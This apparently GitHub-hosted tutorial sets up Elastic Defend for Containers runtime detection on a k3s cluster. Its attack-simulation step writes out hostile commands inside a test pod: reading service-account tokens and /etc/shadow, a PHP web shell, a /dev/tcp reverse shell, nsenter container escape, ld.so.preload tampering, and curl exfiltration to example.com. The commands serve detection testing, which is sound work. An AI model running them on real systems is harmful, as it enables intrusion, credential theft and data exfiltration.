# 🛡️ Defend for Containers (D4C) — Kubernetes Runtime Security with Elastic

> Deploy Elastic's **Defend for Containers** integration on a self-managed Kubernetes cluster (k3s) to get real-time container workload protection using eBPF — detecting process execution, file changes, and container drift.

![Elastic Stack](https://img.shields.io/badge/Elastic%20Stack-9.4.x-005571?style=flat-square&logo=elastic)
![Kubernetes](https://img.shields.io/badge/k3s-v1.35.5-326CE5?style=flat-square&logo=kubernetes)
![eBPF](https://img.shields.io/badge/eBPF-LSM%20%2B%20Tracepoints-orange?style=flat-square)
![OS](https://img.shields.io/badge/Ubuntu-24.04%20%7C%20Kernel%206.8-E95420?style=flat-square&logo=ubuntu)
![Status](https://img.shields.io/badge/Status-Working-brightgreen?style=flat-square)
![AI](https://img.shields.io/badge/Attack%20Discovery-Claude%20Sonnet%204.5-blueviolet?style=flat-square)

---

## 📋 Table of Contents

- [What It Does](#-what-it-does)
- [Architecture](#-architecture)
- [Prerequisites](#-prerequisites)
- [Step 1 — Verify Kernel Requirements](#step-1--verify-kernel-requirements)
- [Step 2 — Enable eBPF LSM at Boot](#step-2--enable-ebpf-lsm-at-boot)
- [Step 3 — Install k3s](#step-3--install-k3s)
- [Step 4 — Pre-create Data Streams in Elasticsearch](#step-4--pre-create-data-streams-in-elasticsearch)
- [Step 5 — Deploy Elastic Agent DaemonSet](#step-5--deploy-elastic-agent-daemonset)
- [Step 6 — Add D4C Integration in Fleet](#step-6--add-d4c-integration-in-fleet)
- [Step 7 — Verify D4C Is Running](#step-7--verify-d4c-is-running)
- [Step 8 — Deploy Test Workload and Trigger Detections](#step-8--deploy-test-workload-and-trigger-detections)
- [Step 9 — Enable SIEM Detection Rules](#step-9--enable-siem-detection-rules)
- [Step 10 — Run Attack Simulations](#step-10--run-attack-simulations)
- [Results](#-results)
- [Step 11 — Attack Discovery](#step-11--attack-discovery)
- [Known Limitations](#-known-limitations)
- [Config Reference](#-config-reference)

---

## 🔍 What It Does

Defend for Containers (D4C) uses **eBPF LSM hooks and tracepoints** to monitor container workloads at the kernel level. It captures runtime behavior and streams telemetry to Elasticsearch where Elastic Security's prebuilt rules detect threats.

| Capability | Description |
|---|---|
| **Process telemetry** | Stream all fork/exec events from containers |
| **Drift detection** | Alert when executables are created or modified inside a running container |
| **Drift prevention** | Block executable changes (policy-configurable) |
| **File monitoring** | Track file create/modify/delete inside containers |
| **Interactive session detection** | Flag when someone execs into a container interactively |
| **SIEM integration** | Feed 20+ prebuilt detection rules for container threats |
| **Attack Discovery** | AI-powered correlation of alerts into MITRE ATT&CK attack chains |

---

## 🏗 Architecture

```
┌──────────────────────────────────────────────────────────┐
│  Ubuntu 24.04 Host (Kernel 6.8 + eBPF LSM enabled)      │
│                                                          │
│  ┌─────────────────────────────────────────────────┐     │
│  │  k3s (Kubernetes v1.35.5)                       │     │
│  │                                                 │     │
│  │  ┌─────────────────────┐  ┌─────────────────┐  │     │
│  │  │ elastic-agent pod   │  │ nginx-test pod  │  │     │
│  │  │ (DaemonSet)         │  │ (workload)      │  │     │
│  │  │                     │  │                 │  │     │
│  │  │ ┌─────────────────┐ │  │ cp /bin/ls      │  │     │
│  │  │ │ cloud-defend    │◀───── /usr/bin/evil  │  │     │
│  │  │ │ (eBPF probes)   │ │  │  ← DETECTED     │  │     │
│  │  │ └────────┬────────┘ │  └─────────────────┘  │     │
│  │  └──────────┼──────────┘                        │     │
│  └─────────────┼───────────────────────────────────┘     │
│                │ HTTPS                                    │
└────────────────┼─────────────────────────────────────────┘
                 ▼
    ┌────────────────────────┐
    │  Elastic Cloud         │
    │  Elasticsearch 9.4.x   │
    │  logs-cloud_defend.*   │
    │                        │
    │  Kibana Security       │
    │  → Kubernetes Dashboard│
    │  → 561 Alerts          │
    │  → Attack Discovery    │
    └────────────────────────┘
```

---

## ✅ Prerequisites

- Ubuntu 22.04+ or Debian 12 (x86_64)
- Kernel **5.10+** (tested on 6.8.0)
- Elastic Cloud deployment with Fleet enabled
- `sudo` / root access
- Internet access (to pull k3s and Elastic Agent images)

---

## Step 1 — Verify Kernel Requirements

```bash
# Kernel version (needs 5.10+)
uname -r

# eBPF and BPF LSM support
grep -E "CONFIG_BPF=|CONFIG_BPF_LSM=|CONFIG_DEBUG_INFO_BTF=" /boot/config-$(uname -r)

# BTF file (required for eBPF programs)
ls -la /sys/kernel/btf/vmlinux && echo "BTF available"
```

All three must show `=y`:
```
CONFIG_BPF=y
CONFIG_BPF_LSM=y
CONFIG_DEBUG_INFO_BTF=y
```

---

## Step 2 — Enable eBPF LSM at Boot

The kernel compiles in BPF LSM support but doesn't activate it by default:

```bash
# Check current LSMs — 'bpf' will be missing
cat /sys/kernel/security/lsm

# Add bpf to the GRUB kernel command line
sudo sed -i \
  's/GRUB_CMDLINE_LINUX="\(.*\)"/GRUB_CMDLINE_LINUX="\1 lsm=lockdown,capability,landlock,yama,apparmor,bpf"/' \
  /etc/default/grub

# Apply and reboot
sudo update-grub
sudo reboot
```

After reboot, verify `bpf` is active:

```bash
cat /sys/kernel/security/lsm
# Must include: ...,apparmor,bpf
```

---

## Step 3 — Install k3s

```bash
# Install k3s (single-node Kubernetes with containerd)
curl -sfL https://get.k3s.io | sh -

# Set up kubeconfig
mkdir -p ~/.kube
sudo cp /etc/rancher/k3s/k3s.yaml ~/.kube/config
sudo chown $(id -u):$(id -g) ~/.kube/config
export KUBECONFIG=~/.kube/config

# Verify node is Ready
kubectl get nodes

# Create namespace for the agent
kubectl create namespace elastic-agent
```

---

## Step 4 — Pre-create Data Streams in Elasticsearch

This step is **critical** for self-managed clusters. Without it, cloud-defend will crash with "index is missing" errors when trying to write events.

In **Kibana → Dev Tools**, run:

```
PUT _data_stream/logs-cloud_defend.process-default
PUT _data_stream/logs-cloud_defend.file-default
PUT _data_stream/logs-cloud_defend.alerts-default
```

> These data streams will be auto-populated with the correct mappings once the D4C integration is installed in Step 6.

---

## Step 5 — Deploy Elastic Agent DaemonSet

### Get Fleet credentials from Kibana

1. **Fleet Server URL:** Kibana → Fleet → Settings → Fleet Server hosts
2. **Enrollment Token:** Kibana → Fleet → Enrollment tokens → Create enrollment token → select your Agent Policy → copy token

### Update the manifest

Download [elastic-agent-d4c.yaml](#config-reference) and replace the two placeholders:

```yaml
- name: FLEET_URL
  value: "<YOUR_FLEET_URL>"          # e.g. https://xxx.fleet.us-east-2.aws.elastic-cloud.com:443
- name: FLEET_ENROLLMENT_TOKEN
  value: "<YOUR_ENROLLMENT_TOKEN>"   # from Fleet → Enrollment tokens
```

### Deploy

```bash
kubectl apply -f elastic-agent-d4c.yaml
kubectl get pods -n elastic-agent -w
# Wait for STATUS: Running (~60-90 seconds for the ~1GB image)
```

### Verify enrollment

Check **Kibana → Fleet → Agents** — your host should appear as **Healthy**.

> **Important:** The image must be `elastic-agent-complete` — the standard image does not include the `cloud-defend` binary.

---

## Step 6 — Add D4C Integration in Fleet

1. **Kibana → Fleet → Agent Policies → [your policy]**
2. Click **Add integration**
3. Search **"Defend for Containers (BETA)"**
4. Click **Add Defend for Containers**
5. Set the policy YAML to include both process and file monitoring:

```yaml
process:
  selectors:
    - name: allProcesses
      operation:
        - fork
        - exec
  responses:
    - match:
        - allProcesses
      actions:
        - log
        - alert
file:
  selectors:
    - name: executableChanges
      operation:
        - createExecutable
        - modifyExecutable
  responses:
    - match:
        - executableChanges
      actions:
        - alert
        - log
```

6. Click **Save and deploy changes**

---

## Step 7 — Verify D4C Is Running

Wait ~30 seconds for Fleet to push the config, then:

```bash
kubectl exec -n elastic-agent $(kubectl get pods -n elastic-agent -o jsonpath='{.items[0].metadata.name}') -- \
  elastic-agent status 2>/dev/null | grep -i "cloud\|defend"
```

Expected output:
```
├─ cloud_defend/control-default
│  └─ status: (HEALTHY)
```

Verify data streams are receiving events in **Kibana → Dev Tools**:

```
POST logs-cloud_defend.process-*/_count
{}
```

The count should be greater than 0.

---

## Step 8 — Deploy Test Workload and Trigger Detections

```bash
# Deploy a test container
kubectl run nginx-test --image=nginx --restart=Never
kubectl wait --for=condition=Ready pod/nginx-test --timeout=60s

# Install attack tools inside the container
kubectl exec -it nginx-test -- bash -c "apt-get update -qq && apt-get install -y -qq curl nmap netcat-openbsd 2>/dev/null; echo installed"

# Trigger drift detection (copy binary into container)
kubectl exec -it nginx-test -- bash -c "cp /bin/ls /usr/bin/ls-drift"

# Trigger process detection (interactive session)
kubectl exec -it nginx-test -- bash -c "whoami && id"
```

Check **Kibana → Security → Alerts** — you should see:
- "Container filesystem modification detected" (drift)
- "Container process execution detected" (process)

Also check **Security → Dashboards → Kubernetes** to see the cluster overview with pods, sessions, and container images.

---

## Step 9 — Enable SIEM Detection Rules

1. **Kibana → Security → Rules → Detection rules (SIEM)**
2. Search for **"Defend for Containers"**
3. Enable all D4C-specific rules:

| Rule | Severity |
|---|---|
| Nsenter Execution with Target Flag Inside Container | High |
| Web Server Exploitation Detected via D4C | High |
| Ingress Tool Transfer Followed by Execution and Deletion | High |
| Dynamic Linker Modification Detected via D4C | High |
| Suspicious Process Execution Detected via D4C | High |
| Encoded Payload Detected via D4C | Medium |
| Sensitive File Compression Detected via D4C | Medium |
| Suspicious Container Runtime CLI Execution | Medium |
| Interactive Exec Into Container Detected via D4C | Low |
| Chroot Execution Detected via D4C | Low |
| Mount Execution Detected via D4C | Low |
| Suspicious Network Tool Launch Detected via D4C | Low |
| Kubelet Certificate File Access Detected via D4C | Low |
| Cluster Enumeration via jq Detected via D4C | Low |
| Direct Interactive Kubernetes API Request via D4C | Low |

---

## Step 10 — Run Attack Simulations

Simulate a full multi-stage container attack to trigger all enabled rules:

```bash
# ── RECONNAISSANCE ──
kubectl exec -it nginx-test -- bash -c "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
kubectl exec -it nginx-test -- bash -c "curl -sk https://kubernetes.default.svc/api/v1/namespaces \
  -H 'Authorization: Bearer \$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)' 2>/dev/null | head -20"
kubectl exec -it nginx-test -- bash -c "nmap -sn 10.42.0.0/24 2>/dev/null; echo done"

# ── CREDENTIAL ACCESS ──
kubectl exec -it nginx-test -- bash -c "cat /etc/shadow"
kubectl exec -it nginx-test -- bash -c "find / -name 'id_rsa' -o -name '*.pem' -o -name '*.key' 2>/dev/null | head -10"
kubectl exec -it nginx-test -- bash -c "find / -name 'credentials' -path '*aws*' 2>/dev/null; env | grep -i AWS 2>/dev/null; echo done"
kubectl exec -it nginx-test -- bash -c "grep -r 'password\|secret\|token' /etc/ 2>/dev/null | head -10"

# ── ENCODED PAYLOADS ──
kubectl exec -it nginx-test -- bash -c "echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash"
kubectl exec -it nginx-test -- bash -c "echo 'aWQ=' | base64 -d | bash"

# ── SUSPICIOUS TOOL EXECUTION ──
kubectl exec -it nginx-test -- bash -c "nmap --version 2>/dev/null"
kubectl exec -it nginx-test -- bash -c "nc -zv kubernetes.default.svc 443 2>&1; echo done"

# ── INGRESS TOOL TRANSFER + EXECUTION + CLEANUP ──
kubectl exec -it nginx-test -- bash -c "curl -o /tmp/exploit http://example.com 2>/dev/null && chmod +x /tmp/exploit && /tmp/exploit 2>/dev/null; rm -f /tmp/exploit"
kubectl exec -it nginx-test -- bash -c "curl -o /tmp/miner http://example.com 2>/dev/null && chmod 777 /tmp/miner; rm /tmp/miner"

# ── CONTAINER DRIFT (PERSISTENCE) ──
kubectl exec -it nginx-test -- bash -c "cp /bin/sh /usr/local/bin/backdoor-sh"
kubectl exec -it nginx-test -- bash -c "cp /bin/dash /usr/sbin/hidden-shell"
kubectl exec -it nginx-test -- bash -c "echo '#!/bin/bash' > /usr/bin/malicious && chmod +x /usr/bin/malicious"

# ── PRIVILEGE ESCALATION ──
kubectl exec -it nginx-test -- bash -c "nsenter --target 1 --mount --uts --ipc --net --pid -- whoami 2>/dev/null; echo done"
kubectl exec -it nginx-test -- bash -c "chroot /proc/1/root ls /tmp 2>/dev/null; echo done"
kubectl exec -it nginx-test -- bash -c "mount /dev/sda1 /mnt 2>/dev/null; echo done"
kubectl exec -it nginx-test -- bash -c "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash 2>/dev/null; echo done"

# ── DEFENSE EVASION ──
kubectl exec -it nginx-test -- bash -c "echo '/tmp/rootkit.so' >> /etc/ld.so.preload 2>/dev/null; echo done"
kubectl exec -it nginx-test -- bash -c "touch -t 202001010000 /usr/bin/malicious 2>/dev/null; echo done"

# ── WEB EXPLOITATION ──
kubectl exec -it nginx-test -- bash -c "echo '<?php system(\$_GET[\"cmd\"]); ?>' > /usr/share/nginx/html/cmd.php"
kubectl exec -it nginx-test -- bash -c "echo '#!/bin/bash' > /usr/share/nginx/html/shell.cgi && chmod +x /usr/share/nginx/html/shell.cgi"
kubectl exec -it nginx-test -- bash -c "echo '#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > /tmp/revshell.sh && chmod +x /tmp/revshell.sh"

# ── CONTAINER RUNTIME ABUSE ──
kubectl exec -it nginx-test -- bash -c "docker ps 2>/dev/null; crictl ps 2>/dev/null; kubectl get pods 2>/dev/null; echo done"

# ── DATA EXFILTRATION ──
kubectl exec -it nginx-test -- bash -c "tar czf /tmp/exfil.tar.gz /etc/passwd /etc/shadow /etc/hosts 2>/dev/null; echo done"
kubectl exec -it nginx-test -- bash -c "tar czf /tmp/k8s-secrets.tar.gz /var/run/secrets/ 2>/dev/null; echo done"
kubectl exec -it nginx-test -- bash -c "curl -X POST -d @/etc/passwd http://example.com 2>/dev/null; echo done"

# ── KUBELET CERTS & DEBUGFS ──
kubectl exec -it nginx-test -- bash -c "cat /var/lib/kubelet/pki/kubelet.crt 2>/dev/null; echo done"
kubectl exec -it nginx-test -- bash -c "debugfs /dev/sda1 2>/dev/null; echo done"
```

Wait 5 minutes for SIEM rules to execute, then check:

```
Kibana → Security → Alerts → Last 30 minutes
```

---

## 📊 Results

After running the full attack simulation suite:

### Security Alerts

```
561 alerts total

Severity levels:
  High:    1
  Medium:  534
  Low:     26

Alerts by name:
  Container process execution detected           469
  Container filesystem modification detected       57
  Interactive Exec Into Container Detected          21
  Encoded Payload Detected via D4C                   3

Top alerts by host:
  ubuntu-test                                    100%
```

### Kubernetes Security Dashboard

```
Clusters: 1    Namespaces: 2    Nodes: 1    Pods: 2    Container images: 2

Container images:
  docker.io/library/nginx                    3 sessions
  docker.elastic.co/elastic-agent/elastic... 2 sessions

Session interactivity:  Interactive: 2  |  Non-interactive: 2
Entry session users:    Root: 4         |  Non-root: 0
```

### Attack Discovery

```
1 discovery  ·  40 correlated alerts
"Container Compromise and Data Exfiltration"
AI model: Anthropic Claude Sonnet 4.5 via Elastic AI Agent
```

---

## Step 11 — Attack Discovery

Attack Discovery uses AI to analyze your alerts and automatically correlate them into coherent attack narratives mapped to MITRE ATT&CK tactics.

### Set up an AI connector

1. **Kibana → Stack Management → Connectors → Create connector**
2. Select a provider:

| Provider | What you need |
|---|---|
| **Elastic AI Assistant** | Available on Security Complete / Enterprise tier |
| **OpenAI** | API key from platform.openai.com |
| **Azure OpenAI** | Azure endpoint + API key |
| **Amazon Bedrock** | AWS credentials + region |

3. Name and configure the connector, then **Save & test**

### Run Attack Discovery

1. **Kibana → Security → Attack discovery**
2. Select your AI connector from the **model dropdown**
3. Click **Generate**
4. Attack Discovery analyzes all open alerts and groups them into attack chains

### Results

After running the full attack simulation (Step 10), Attack Discovery identified:

```
1 discovery  ·  40 correlated alerts

"Container Compromise and Data Exfiltration"

Summary: Complete attack chain on ubuntu-test from reconnaissance
through container escape, credential theft, and data exfiltration.
```

**Attack chain identified:**

| Phase | What was detected |
|---|---|
| **Reconnaissance** | Base64-encoded commands to enumerate users (`cat /etc/passwd`), check privileges (`id`), identify OS (`uname -a`) |
| **Privilege Escalation** | `nsenter --target 1 --mount --uts --ipc --net --pid` to escape container isolation and access host namespace |
| **Credential Theft** | Kubernetes service account token access, certificate enumeration |
| **Data Exfiltration** | Sensitive file compression and transfer attempts |

**AI-generated recommended next steps:**

1. **Immediate Isolation** — Disconnect `ubuntu-test` from the network to halt ongoing exfiltration and lateral movement
2. **Credential Rotation** — Revoke and regenerate all Kubernetes certificates, API tokens, and service account credentials
3. **Forensic Preservation** — Capture container logs, filesystem snapshots, and network traffic for post-incident analysis
4. **Threat Hunt** — Search for similar patterns across the cluster: nsenter executions with `--target 1`, base64-decoded payloads piped to interpreters, suspicious curl/wget exfiltration attempts

> Attack Discovery was powered by **Anthropic Claude Sonnet 4.5** via the Elastic AI Agent connector.

---

## ⚠️ Known Limitations

### Self-managed cluster — cloud metadata unavailable

On non-cloud clusters (like k3s on bare metal), D4C logs `could not detect cloud provider`. This is expected — all `cloud.*` fields will be empty and the cluster name shows as "unknown" in the Kubernetes dashboard. All detection capabilities work normally.

### Data streams must be pre-created on self-managed clusters

Before adding the D4C integration, the three data streams must exist in Elasticsearch (see Step 4). Without this, cloud-defend will crash with "index is missing" errors on the first flush attempt.

### elastic-agent-complete image required

The standard `elastic-agent` image does not include the `cloud-defend` binary. You must use `docker.elastic.co/elastic-agent/elastic-agent-complete:<version>`.

### Minimum kernel version

D4C requires kernel **5.10.16+** with `CONFIG_BPF_LSM=y` and `bpf` added to the active LSM stack via GRUB boot parameters.

---

## 📁 Config Reference

### elastic-agent-d4c.yaml

```yaml
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: elastic-agent
  namespace: elastic-agent
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: elastic-agent
rules:
  - apiGroups: [""]
    resources:
      - nodes
      - namespaces
      - events
      - pods
      - services
      - configmaps
      - serviceaccounts
      - persistentvolumes
      - persistentvolumeclaims
    verbs: ["get", "list", "watch"]
  - apiGroups: ["extensions"]
    resources: ["replicasets"]
    verbs: ["get", "list", "watch"]
  - apiGroups: ["apps"]
    resources: ["statefulsets", "deployments", "replicasets", "daemonsets"]
    verbs: ["get", "list", "watch"]
  - apiGroups: ["batch"]
    resources: ["jobs", "cronjobs"]
    verbs: ["get", "list", "watch"]
  - apiGroups: [""]
    resources: ["nodes/stats", "nodes/proxy", "nodes/metrics"]
    verbs: ["get"]
  - nonResourceURLs: ["/metrics"]
    verbs: ["get"]
  - apiGroups: ["rbac.authorization.k8s.io"]
    resources: ["clusterrolebindings", "clusterroles", "rolebindings", "roles"]
    verbs: ["get", "list", "watch"]
  - apiGroups: ["storage.k8s.io"]
    resources: ["storageclasses"]
    verbs: ["get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: elastic-agent
subjects:
  - kind: ServiceAccount
    name: elastic-agent
    namespace: elastic-agent
roleRef:
  kind: ClusterRole
  name: elastic-agent
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: elastic-agent
  namespace: elastic-agent
  labels:
    app: elastic-agent
spec:
  selector:
    matchLabels:
      app: elastic-agent
  template:
    metadata:
      labels:
        app: elastic-agent
    spec:
      serviceAccountName: elastic-agent
      hostNetwork: true
      hostPID: true
      dnsPolicy: ClusterFirstWithHostNet
      tolerations:
        - key: node-role.kubernetes.io/control-plane
          effect: NoSchedule
        - key: node-role.kubernetes.io/master
          effect: NoSchedule
      containers:
        - name: elastic-agent
          # Must use -complete image — standard image lacks cloud-defend
          image: docker.elastic.co/elastic-agent/elastic-agent-complete:9.4.2
          env:
            - name: FLEET_ENROLL
              value: "1"
            - name: FLEET_URL
              value: "<YOUR_FLEET_URL>"
            - name: FLEET_ENROLLMENT_TOKEN
              value: "<YOUR_ENROLLMENT_TOKEN>"
            - name: FLEET_INSECURE
              value: "false"
            - name: NODE_NAME
              valueFrom:
                fieldRef:
                  fieldPath: spec.nodeName
            - name: POD_NAME
              valueFrom:
                fieldRef:
                  fieldPath: metadata.name
            - name: ELASTIC_NETINFO
              value: "false"
            # Required for cloud-defend to read host process list
            - name: HOSTFS_PROC_PATH
              value: "/hostfs/proc"
          securityContext:
            runAsUser: 0
            capabilities:
              add:
                - BPF
                - PERFMON
                - SYS_RESOURCE
                - NET_ADMIN
                - SYS_PTRACE
                - DAC_READ_SEARCH
          resources:
            requests:
              memory: "500Mi"
              cpu: "100m"
            limits:
              memory: "1200Mi"
              cpu: "1000m"
          volumeMounts:
            - name: proc
              mountPath: /hostfs/proc
              readOnly: true
            - name: cgroup
              mountPath: /hostfs/sys/fs/cgroup
              readOnly: true
            - name: varlibdockercontainers
              mountPath: /var/lib/docker/containers
              readOnly: true
            - name: varlog
              mountPath: /var/log
              readOnly: true
            - name: etc-full
              mountPath: /hostfs/etc
              readOnly: true
            - name: var-lib
              mountPath: /hostfs/var/lib
              readOnly: true
            - name: etc-mid
              mountPath: /etc/machine-id
              readOnly: true
            - name: sys-kernel-debug
              mountPath: /sys/kernel/debug
            # Required for cloud-defend (D4C)
            - name: boot
              mountPath: /boot
              readOnly: true
            - name: sys-fs-bpf
              mountPath: /sys/fs/bpf
            - name: sys-kernel-security
              mountPath: /sys/kernel/security
              readOnly: true
            # k3s containerd socket
            - name: containerd-sock
              mountPath: /run/k3s/containerd/containerd.sock
            - name: elastic-agent-state
              mountPath: /usr/share/elastic-agent/state
      volumes:
        - name: proc
          hostPath:
            path: /proc
        - name: cgroup
          hostPath:
            path: /sys/fs/cgroup
        - name: varlibdockercontainers
          hostPath:
            path: /var/lib/docker/containers
        - name: varlog
          hostPath:
            path: /var/log
        - name: etc-full
          hostPath:
            path: /etc
        - name: var-lib
          hostPath:
            path: /var/lib
        - name: etc-mid
          hostPath:
            path: /etc/machine-id
            type: File
        - name: sys-kernel-debug
          hostPath:
            path: /sys/kernel/debug
        # Required for cloud-defend (D4C)
        - name: boot
          hostPath:
            path: /boot
        - name: sys-fs-bpf
          hostPath:
            path: /sys/fs/bpf
        - name: sys-kernel-security
          hostPath:
            path: /sys/kernel/security
        # k3s containerd socket
        - name: containerd-sock
          hostPath:
            path: /run/k3s/containerd/containerd.sock
        - name: elastic-agent-state
          hostPath:
            path: /var/lib/elastic-agent-state
            type: DirectoryOrCreate
```

---

## 🔗 References

- [Defend for Containers — Elastic Docs](https://www.elastic.co/docs/solutions/security/cloud/d4c/d4c-overview)
- [Getting Started with D4C — Elastic Security Labs](https://www.elastic.co/security-labs/getting-started-with-defend-for-containers)
- [cloud_defend Integration Reference](https://www.elastic.co/docs/reference/integrations/cloud_defend)
- [Elastic Agent Managed K8s YAML — GitHub](https://github.com/elastic/elastic-agent/blob/main/deploy/kubernetes/elastic-agent-managed-kubernetes.yaml)
- [k3s Quick Start](https://docs.k3s.io/quick-start)

---

## 🧪 Environment

Tested on:

- **OS:** Ubuntu 24.04.3 LTS
- **Kernel:** 6.8.0-124-generic (eBPF LSM enabled via GRUB)
- **Kubernetes:** k3s v1.35.5+k3s1 (containerd 2.2.3)
- **Elastic Agent:** 9.4.2 (`elastic-agent-complete` image)
- **Elasticsearch:** 9.4.1 (Elastic Cloud, us-east-2)
- **D4C Integration:** v1.4.0 (BETA)

---

*Last updated: June 2026 · Elastic Stack 9.4.x*
